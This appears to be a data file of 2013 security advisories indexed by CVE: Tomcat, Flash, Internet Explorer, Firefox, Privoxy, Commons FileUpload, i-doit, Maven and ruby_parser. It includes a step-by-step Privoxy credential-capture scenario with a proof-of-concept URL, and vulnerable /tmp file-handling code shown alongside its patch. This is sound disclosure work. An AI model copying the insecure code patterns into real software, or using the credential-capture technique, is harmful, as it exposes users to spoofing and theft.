-----END PGP SIGNATURE-----"
8589,CVE-2013-2071 Request mix-up if AsyncListener method throws RuntimeException,,CVE-2013-2071,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-2071 Request mix-up if AsyncListener method throws
RuntimeException
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.39
Description:
Bug 54178 described a scenario where elements of a previous request may
be exposed to a current request. This was very difficult to exploit
deliberately but fairly likely to happen unexpectedly if an application
used AsyncListeners that threw RuntimeExceptions. The issue was fixed by
catching the RuntimeExceptions.
Mitigation:
Users of affected versions should apply the following mitigation:
- - Tomcat 7.0.x users should upgrade to 7.0.40 or later
Credit:
The security implications of this issue were identified by the Apache
Tomcat Security Team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
https://issues.apache.org/bugzilla/show_bug.cgi?id=54178
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJRjLHMAAoJEBDAHFovYFnnOIAP/A9HXwQgnJKYl+gXwqFkjXaq
blo70uMMUpKPJ61l/keEguxZ/iGdQC4H2osjQiG7lhoOPvrMKtewCMXDAk/j9Skd
HXuQVSge22Na16M6GUNXARziyDk/44k8RHy3cibrPZPhUNVD743N50toPK8Q6UKR
PmAANa/kB9vvD589PCQLx/i6oiS5jaAwjoSdbwshtJytXrxoHgUrRLl3P5/sPBiq
57H/pAELR4aorfSj+tJL63ySX9v4NRiB55u3hNDgZOnPz3D9sjMsmq5vSzhfyiHh
NnkYGa7+ZfnBL6DJ4eiV5z7lbMFIBa7ZzcyYEhVFCIsbnSwTL2l0a3NSkuQ0xiXS
0jQDenOuCujL1Zw5YYHhRDy2rGbFG8q/Z+ZSQ3NP0vnmQCpCfsY3mBIFCWzhmK+h
TnFKdtxA+Ev/HSGPlSK1hADiYwL/iLb6YMoyintgj2mDIxrdHhcfMq8h6GYD1rbF
vlbWSpmgN81xdU8JxEbnq6PC60OeZH5x08Sj9B3YQlB8E4Pq9B/EaEFYF9oZdYcP
+DQWcd78SBNevg+fgKdKK8CjU5JQhMWetxv6HUomS7j3LgoJQPwVrNcg0yjV1v/g
qgddQ1DOamD+KuQxh08NHfMZP08g5a+CrQ6qpe3/pr/OI0PlTN23aCXvCEGl2KlZ
Cn4w/1eoL4agb5oREL2U
=vQbB
-----END PGP SIGNATURE-----"
8680,VUPEN Security Research - Adobe Flash Player RTMP Data Processing Object Confusion (CVE-2013-2555),,CVE-2013-2555,"VUPEN Security Research - Adobe Flash Player RTMP Data Processing Object
Confusion Code Execution (CVE-2013-2555)
Website : http://www.vupen.com
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Adobe Flash Player is a cross-platform browser-based application runtime
that delivers viewing of expressive applications, content, and videos
across screens and browsers. It is installed on 98% of computers.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Adobe Flash Player.
The vulnerability is caused by an object confusion error when processing
malformed Real Time Messaging Protocol (RTMP) data received during the
initial phase of communication with a server, which could be exploited
by remote attackers to compromise a vulnerable system via a malicious
web page.
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 11.7.700.169
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
remote code execution exploit are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to Flash Player version 11.7.700.169.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of defensive and offensive cybersecurity
intelligence and advanced vulnerability research. VUPEN solutions enable
corporations and governments to manage risks, and protect critical networks
and infrastructures against known and unknown vulnerabilities.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://www.adobe.com/support/security/bulletins/apsb13-11.html
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2012-02-15 - Vulnerability Discovered by VUPEN
2013-03-06 - Vulnerability Exploited At Pwn2Own 2013 and Reported to Adobe
2013-04-17 - Public disclosure"
8772,CVE-2013-0798 : World read and write access to app_tmp directory on Android,,CVE-2013-0798,"##############################################################
Fourteenforty Research Institute, Inc. Security Advisory
World read and write access to app_tmp directory
on Firefox for Android
2013/04/02
##############################################################
=== Summary ===
World read and write access to app_tmp directory
on Firefox for Android allows replacing Firefox add-ons.
=== Severity ===
Middle
=== Affected Products ===
Fireforx for Android before version 20
=== Potential Security Impact ===
Information leak
Information falsification
=== Solution ===
Update Firefox for Android
=== Detailed Description ===
The app_tmp directory is set to be world readable and
writeable by Firefox for Android. This potentially allows
for third party applications to replace or alter Firefox
add-ons when downloaded because they are temporarily
stored in the app_tmp directory before installation.
== Time Table ==
2013/02/22 The vulnerability was reported to Mozilla
2013/04/02 The fixed version of Firefox for Android was released
=== Credits ===
This vulnerability was discovered by Shuichiro Suzuki of Fourteenforty Research
Institute.
=== Reference ===
CVE No. : CVE-2013-0798
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0798
Mozilla Foundation Security Advisory :
https://www.mozilla.org/security/announce/2013/mfsa2013-33.html
FFRI Advisory URL:
http://www.fourteenforty.jp/cgi-bin/advisory/advisory.cgi?type=release&id=FFRRA-20130402
=== About FFRI ===
Fourteenforty Research Institute (FFRI) is a leading security products
and service vendor in Japan providing innovative security software and
vulnerability research information. Our commitment is to secure our
IT-driven society by protecting information system from unpredictable
threats.
http://www.fourteenforty.jp
research-feedback fourteenforty jp
=== Copyright ===
2007 - 2013 Fourteenforty Research Institute, Inc. All rights reserved."
8905,"Re: VUPEN Security Research - Microsoft Internet Explorer 10-9-8-7-6 ""OnResize"" Use-after-free (MS13-021 / CVE-2013-0087)",,CVE-2013-0087,"Hi,
On 2013-03-19 10:18, VUPEN Security Research wrote:
> X. DISCLOSURE TIMELINE
> -----------------------------
>
> 2010-06-29 - Vulnerability Discovered by VUPEN and shared with VUPEN TPP
> customers
> 2013-03-12 - MS13-021 security bulletin released
> 2013-03-18 - Public disclosure
Can you please tell us the date you informed Microsoft about the
discovered vulnerability or was it also available to Microsoft since
June 2010?
Thanks.
--
Regards,
Thomas"
8907,"VUPEN Security Research - Microsoft Internet Explorer 10-9-8-7-6 ""OnMove"" Use-after-free (MS13-021 / CVE-2013-0087)",,CVE-2013-0087,"VUPEN Security Research - Microsoft Internet Explorer 10-9-8-7-6
""OnMove"" Use-after-free (MS13-021 / CVE-2013-0087)
Website : http://www.vupen.com
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error within the MSHTML
""CElement::EnsureRecalcNotify()"" function when processing ""onMove""
events, which could be exploited by remote attackers to compromise
a vulnerable system via a malicious web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 10
Microsoft Internet Explorer 9
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows 8 for 32-bit Systems
Microsoft Windows 8 for x64-based Systems
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
remote code execution exploit are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS13-021 security updates.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of defensive and offensive cybersecurity
intelligence and advanced vulnerability research. VUPEN solutions enable
corporations and governments to manage risks, and protect critical networks
and infrastructures against known and unknown vulnerabilities.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
https://technet.microsoft.com/en-us/security/bulletin/ms13-021
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2010-06-29 - Vulnerability Discovered by VUPEN and shared with VUPEN TPP
customers
2013-03-12 - MS13-021 security bulletin released
2013-03-18 - Public disclosure"
8908,"VUPEN Security Research - Microsoft Internet Explorer 10-9-8-7-6 ""OnResize"" Use-after-free (MS13-021 / CVE-2013-0087)",,CVE-2013-0087,"VUPEN Security Research - Microsoft Internet Explorer 10-9-8-7-6
""OnResize"" Use-after-free (MS13-021 / CVE-2013-0087)
Website : http://www.vupen.com
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error within the MSHTML
""CElement::EnsureRecalcNotify()"" function when processing ""onResize""
events, which could be exploited by remote attackers to compromise
a vulnerable system via a malicious web page.
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 10
Microsoft Internet Explorer 9
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows 8 for 32-bit Systems
Microsoft Windows 8 for x64-based Systems
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
remote code execution exploit are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS13-021 security updates.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of defensive and offensive cybersecurity
intelligence and advanced vulnerability research. VUPEN solutions enable
corporations and governments to manage risks, and protect critical networks
and infrastructures against known and unknown vulnerabilities.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
https://technet.microsoft.com/en-us/security/bulletin/ms13-021
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2010-06-29 - Vulnerability Discovered by VUPEN and shared with VUPEN TPP
customers
2013-03-12 - MS13-021 security bulletin released
2013-03-18 - Public disclosure"
8909,"VUPEN Security Research - Mozilla Firefox ""nsHTMLEditRules"" Use-After-Free (MFSA-2013-29 / CVE-2013-0787)",,CVE-2013-0787,"VUPEN Security Research - Mozilla Firefox ""nsHTMLEditRules""
Use-After-Free (MFSA-2013-29 / CVE-2013-0787)
Website : http://www.vupen.com
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Mozilla Firefox is a free and open source web browser coordinated by
Mozilla Corporation and Mozilla Foundation. As of August 2012, Firefox
has approximately 23% of worldwide usage share of web browsers (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Mozilla Firefox.
The vulnerability is caused by a use-after-free error within the XUL
""nsHTMLEditRules::nsHTMLEditRules()"" function when processing certain
objects, which could be exploited by remote attackers to compromise
a vulnerable system via a malicious web page.
The vulnerability has been exploited during Pwn2Own 2013.
III. AFFECTED PRODUCTS
---------------------------
Mozilla Firefox version 19.0.1 and prior
Mozilla Firefox ESR version 17.0.3 and prior
Mozilla Thunderbird version 17.0.3 and prior
Mozilla Thunderbird ESR version 17.0.3 and prior
Mozilla SeaMonkey version 2.16 and prior
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
remote code execution exploit are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to the following versions:
Firefox 19.0.2 or later
Firefox ESR 17.0.4 or later
Thunderbird 17.0.4 or later
Thunderbird ESR 17.0.4 or later
SeaMonkey 2.16.1 or later
VII. CREDIT
--------------
This vulnerability was discovered and exploited by Chaouki Bekrar, Jordan
Gruskovnjak, and Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of defensive and offensive cybersecurity
intelligence and advanced vulnerability research. VUPEN solutions enable
corporations and governments to manage risks, and protect critical networks
and infrastructures against known and unknown vulnerabilities.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
https://www.mozilla.org/security/announce/2013/mfsa2013-29.html
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2013-02-26 - Vulnerability Discovered by VUPEN
2013-03-06 - Vulnerability Reported to Mozilla by VUPEN During Pwn2Own 2013
2013-03-07 - MFSA-2013-29 security bulletin released
2013-03-18 - Public disclosure"
8953,Privoxy Proxy Authentication Credential Exposure - CVE-2013-2503,,CVE-2013-2503,"Privoxy Proxy Authentication Credential Exposure
Product: Privoxy
Project Homepage: privoxy.org
Advisory ID: c22-2013-01
Vulnerable Version(s): 3.0.20 (and possibly prior)
Tested Version: 3.0.20-1 (tested using Debian Sid)
Vendor Notification: March 6, 2013
Public Disclosure: March 11, 2013
Vulnerability Type: Insufficiently Protected Credentials [CWE-522]
CVE Reference: CVE-2013-2503
Risk Level: Medium
CVSSv2 Base Score: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
Discovery: Chris John Riley ( http://blog.c22.cc )
Advisory Details:
During research into browser and proxy server handling of HTTP
Response Codes, an issue with the way that Privoxy handles HTTP
Response code 407 ""Proxy Authentication Required"" was discovered.
Privoxy in versions 3.0.20 (and possibly prior) ignores the presence of
""Proxy-Authenticate"" and ""Proxy-Authorization"" headers and allows these
values to be passed to and from a remote server without modification.
The resulting behavior could allow a malicious websites to spoof a
Proxy-Authentication response appearing to originate from the Privoxy
service. The Privoxy user will then be prompted for a username and
password that appears to originate from the Privoxy software.
Scenario:
1) A Privoxy user visits a website using a browser of their choice
2) The remote website responds to the request with a 407 ""Proxy
Authentication Required"" HTTP response code and the appropriate
""Proxy-Authenticate: Basic"" HTTP response header
3) This response is passed through the Privoxy service without
modification to the users browser
4) As the browser is configured to use a proxy server, the browser
believes that the upstream proxy (Privoxy) has requested
authentication and prompts the user for a username and password. This
prompt states that the proxy server at ""127.0.0.1:8118"" requires
authentication (this prompt may vary if Privoxy is running on a
machine other than localhost and/or on a non-default port number)
5) If the user enters a username and password, the browser will send
a request through Privoxy to the remote website with a
""Proxy-Authorization: XXXXXXXX"" HTTP request header (where XXXXXXX is
a base64 encoded version of the username and password the user
entered at the browsers proxy authentication prompt)
6) The remote website receives this header and can store or re-use
these captured credentials
Proof of Concept:
http://c22.cc/POC/c22-2013-01.php
The above URL will respond with a ""Proxy-Authenticate: basic"" header
when a request is received that does no contain a
""Proxy-Authorization"" header. This will prompt the users browser to
request a username/password from the user. If you enter a value in the
username/password box and click ok, it will send a Base64 encoded
version to the remote website (the server will display the response
headers at the bottom of the resulting page under request headers (one
of the values will be ""Proxy-Authorization"" with a base64 encoded
version of the entered username/password). For a full walkthrough it
is suggested to capture this in your favourite packet capture program
and walk through the requests to view the entire process.
Note --> The above POC does not store any data sent to the server,
however it is suggested to use bogus credentials if testing this proof of
concept.
Solution:
The following solution was suggested and implemented in Privoxy 3.0.21
stable.
Proxy authentication headers are removed unless the new directive
enable-proxy-authentication-forwarding is used. Forwarding the headers
potentionally allows malicious sites to trick the user into providing
it with login information.
References:
Privoxy 3.0.21 ChangeLog -->
http://ijbswa.cvs.sourceforge.net/viewvc/ijbswa/current/ChangeLog?revision=1.188&view=markup
Vulnerability Timeline:
March 5, 2013 20:00 - Initial discovery of vulnerability
March 6, 2013 14:48 > Emailed Privoxy developer list to request a
security contact
March 6, 2013 15:26 < Received response with dedicated security contact
information
March 6, 2013 16:01 > Emailed details of the vulnerability to security
contact
March 6, 2013 17:19 < Received response acknowledging issue. Fix
indicated in upcoming release
March 6, 2013 18:38 > Acknowledged receipt of email and advised of
updated CVSSv2 score
March 7, 2013 15:50 < Received response detailing proposed fix,
including link to CVS check-in of new code
March 7, 2013 18:48 > Acknowledged receipt of email
March 9, 2013 16:54 > Emailed CVE number to security contact and
requested information on release plans
March 10, 2013 14:28 < Received confirmation of release timeline
March 10, 2013 14:58 - Release of Privoxy 3.0.21 stable
March 11, 2013 07:45 - Release of advisory
--
--
ï¿½ Chris John Riley ï¿½
ï¿½ http://blog.c22.cc ï¿½
--
------------------------------------------
All emails ROT-26 encrypted
------------------------------------------"
8980,[SECURITY] CVE-2013-0248 Apache Commons FileUpload - Insecure examples,,CVE-2013-0248,"CVE-2013-0248 Apache Commons FileUpload - Insecure examples
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- Commons FileUpload 1.0 to 1.2.2
Description:
Commons FileUpload provides file upload capability for Servlets and web
applications. During the upload process, FileUpload may (depending on
configuration) save the uploaded file temporarily on disk. By default
this will be in the system wide tmp directory. Because the temporary
files have predictable file names and are stored in a publicly writeable
location they are vulnerable to a TOCTOU attack.
A successful attack requires that the attacker has write access to the
tmp directory. The attack can be prevented by setting the repository to
a non-publicly writeable location.
The documentation for FileUpload does not highlight the potential
security implications of not setting a repository, nor do the provided
examples set a repository. This may have caused users to use FileUpload
in an insecure manner.
Mitigation:
Setting the repository to a non-publicly writeable location such as that
defined by the ServletContext attribute javax.servlet.context.tempdir
will prevent the TOCTOU attack.
Credit:
This issue was identified by Karl Dyszynski and Hugo Vazquez Carames of
SonicWall
References:
[1] http://commons.apache.org/fileupload/"
9009,CVE-2013-1413,,CVE-2013-1413,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# CVE ID : CVE-2013-1413
# CSNC ID: CSNC-2013-003
# Product: i-doit
# Vendor: synetics Gesellschaft f�r Systemintegration mbH
# Subject: Cross-site Scripting - XSS
# Risk: High
# Effect: Remotely exploitable
# Author: Stephan Rickauer (stephan.rickauer csnc ch)
# Date: March 1st 2013
#
#############################################################
Introduction:
-------------
Compass Security AG discovered multiple security flaws in the i-doit
CMDB web application.
Vulnerable:
-----------
- i-doit version prior to 1.0 Pro and 0.9.9-7 Open
- i-doit version after 1.0 Pro with disabled input filter (by default)
Patches:
--------
Version 1.0.2 Pro has received a new configure option to 'sanitize user
input' which defaults to off and has to be manually enabled.
Description:
------------
The i-doit web application does not properly encode output of user data
in various places. Exploiting this vulnerability leads to so-called
cross-site scripting (XSS) and allows execution of JavaScript code in
the context of the user's session, e.g. to impersonate logged-in i-doit
CMDB users.
Milestones:
-----------
2013-01-20 Vulnerability discovered
2013-01-20 Vendor notified
2013-01-20 CVE requested at MITRE.org
2013-01-21 Vendor contact established, provided with technical details
2013-01-21 CVE-ID assigned by MITRE
2013-01-21 Acknowledgement of vulnerability by vendor and agreement of
advisory release schedule
2013-01-28 More XSS vulnerabilites identified, vendor updated
2013-02-20 Release of patched vendor software
2013-03-01 Public release of advisory
References:
-----------
http://www.i-doit.org
http://www.i-doit.com
http://www.csnc.ch"
9036,Fwd: [SECURITY] CVE-2013-0253 Apache Maven 3.0.4,,CVE-2013-0253,"CVE-2013-0253 Apache Maven
Severity: Medium
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Maven 3.0.4
- Apache Maven Wagon 2.1, 2.2, 2.3
Description:
Apache Maven 3.0.4 (with Apache Maven Wagon 2.1) has introduced a non-secure
SSL mode by default. This mode disables all SSL certificate checking,
including: host name verification , date validity, and certificate
chain. Not validating the certificate introduces the possibility of a
man-in-the-middle attack.
All users are recommended to upgrade to Apache Maven 3.0.5 and Apache
Maven Wagon 2.4.
Credit
This issue was identified by Graham Leggett
--
The Apache Maven Team"
9046,CVE-2013-0162 rubygem-ruby_parser: incorrect temporary file usage / Public Service Announcement,,CVE-2013-0162,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
This is a relatively minor issue, hence no embargo.
Michael Scherer (mscherer redhat com) of Red Hat found:
Looking for incorrect /tmp/ usage, I found the following piece of code
in /usr/share/gems/gems/ruby_parser-2.0.4/lib/gauntlet_rubyparser.rb
(https://rubygems.org/gems/ruby_parser)
def diff_pp o1, o2
require 'pp'
File.open(""/tmp/a.#{$$}"", ""w"") do |f|
PP.pp o1, f
end
File.open(""/tmp/b.#{$$}"", ""w"") do |f|
PP.pp o2, f
end
`diff -u /tmp/a.#{$$} /tmp/b.#{$$}`
ensure
File.unlink ""/tmp/a.#{$$}"" rescue nil
File.unlink ""/tmp/b.#{$$}"" rescue nil
end
This was assigned CVE-2013-0162. The current version of ruby_parser is
3.1.1 and is affected. Fixing this is simple:
diff --git a/lib/gauntlet_rubyparser.rb b/lib/gauntlet_rubyparser.rb
index 4463c38..85137f9 100755
- --- a/lib/gauntlet_rubyparser.rb
+++ b/lib/gauntlet_rubyparser.rb
@@ -35,18 +35,19 @@ class RubyParserGauntlet < Gauntlet
def diff_pp o1, o2
require 'pp'
- - File.open(""/tmp/a.#{$$}"", ""w"") do |f|
- - PP.pp o1, f
- - end
+ file_a = Tempfile.new('ruby_parser_a')
+ PP.pp o1, file_a
+ file_a.close
+
+ file_b = Tempfile.new('ruby_parser_b')
+ PP.pp o2, file_b
+ file_b.close
- - File.open(""/tmp/b.#{$$}"", ""w"") do |f|
- - PP.pp o2, f
- - end
- - `diff -u /tmp/a.#{$$} /tmp/b.#{$$}`
+ `diff -u #{file_a.path} #{file_b.path}`
ensure
- - File.unlink ""/tmp/a.#{$$}"" rescue nil
- - File.unlink ""/tmp/b.#{$$}"" rescue nil
+ file_a.unlink
+ file_b.unlink
end
CC'ing the 3 people listed on ruby_parser as ""owners"".
Also I will be auditing a number of rubygems for various easy things,
as a reminder tmp file vulns are EASY to fix, just use the functions
listed in:
http://kurt.seifried.org/2012/03/14/creating-temporary-files-securely/
===============================
Public Service Announcement
===============================
For public issues please start CC'ing oss-security@ (especially if it
needs a CVE), and also rubysec googlegroups com which will notify the
Ruby Security people (and then cool things like their tools will warn
users of outdated/insecure versions and so on).
For private/embargoed issues the rubygems.org/community is considering
some ways to make it easier to report security issues in gems, we'll
keep you posted.
- --
Kurt Seifried Red Hat Security Response Team (SRT)
PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (GNU/Linux)
iQIcBAEBAgAGBQJRJwmQAAoJEBYNRVNeJnmTtiUQALQ80GH11AWQS+YmGKA6Yhk/
dZ65MdEDAHvyAJ/LewY/URShpEJmwtxOIu2rzlniKwzPSpNZtz15u/jUeNA94ez+
1glzGc5pYF19yL6E/aUf181ZzIhJaI2h9iWNjElui2+l/vkZKuEoygu6fB1CqxUv
d2ykR13dRP+IMj7BLBduLO8WztQ7maOncI9eIv6JgvgysRfffPqbhrUHQyvsow8q
fRSa52cMVvM+4Y6Zc4UvjWlEZwBC8DFt4UlJsa0OoY+UMjqqiKwWIK4/OjgPtd43
ID5CxtjT6x2ANPNLE9UJXoJPKgjvgbghN5wbdOthA8N3jM1s1tbvXDhvKl8zA90d
Eymjelo2iGhHiuQNaAsNqRmab1UlJDcy2UuiIg9IMH7qSMd5l6gosWMHpx4gM39c
moUdNucdpEX0Y33VNMhmjQEhFWy93uGALeHmQZeAAjO+k2/San78nF8luaHyUTXL
qba5VNHdBsWfL0ttHv1XhkWlWT/osRtgQLutLngr9h0nXDGqSJ0RvFOtAsGpvhCh
SfQMAHWPu6GUjhNG+7MedQX/P7kWfDy4qvdDu9kUN++EVcjtK4IOxXBx9KAF8Hj4
//xobZYswtp3zOFzVy5kWqLa5NyqNKye8ZAuqIpDGYfBlR/T5jGM8cMqqRtYyKkE
trGaadlo3zHW1K0Rplea
=FAr9
-----END PGP SIGNATURE-----"
